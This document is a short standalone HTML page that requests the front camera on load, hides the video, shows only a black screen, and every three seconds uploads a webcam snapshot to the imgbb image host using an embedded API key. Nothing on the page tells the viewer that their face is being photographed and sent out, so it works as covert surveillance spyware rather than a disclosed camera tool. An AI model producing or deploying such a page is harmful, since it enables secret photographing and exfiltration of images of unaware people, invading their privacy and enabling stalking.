<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuous Image Upload</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            overflow: hidden;
        }
        #video {
            display: none;
        }
    </style>
</head>
<body>
<video id="video" autoplay></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    let captureInterval;

    function startCapturingAndUploading() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
            .then(function(stream) {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                function captureAndUpload() {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg');

                    const formData = new FormData();
                    formData.append('image', dataURItoBlob(imageData));

                    fetch('https://api.imgbb.com/1/upload?key=bc0128afc43bdda4d55e79c3781728ac', {
                        method: 'POST',
                        body: formData,
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.data) {
                            console.log('Upload successful:', data.data.url);
                            // Consider adding a vibration here if it's critical, but note that it requires user interaction to start.
                        } else {
                            console.log('Failed to upload image. Retrying...');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                }

                function dataURItoBlob(dataURI) {
                    const byteString = atob(dataURI.split(',')[1]);
                    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                    const ab = new ArrayBuffer(byteString.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < byteString.length; i++) {
                        ia[i] = byteString.charCodeAt(i);
                    }
                    return new Blob([ab], {type: mimeString});
                }

                captureInterval = setInterval(captureAndUpload, 3000); // Adjust time as needed
            })
            .catch(function(err) {
                console.error('Error accessing the camera: ', err);
            });
    }

    document.addEventListener("visibilitychange", function() {
        if (document.visibilityState === 'hidden') {
            clearInterval(captureInterval);
        } else {
            startCapturingAndUploading();
        }
    });

    startCapturingAndUploading(); // Start the process automatically
</script>
</body>
</html>
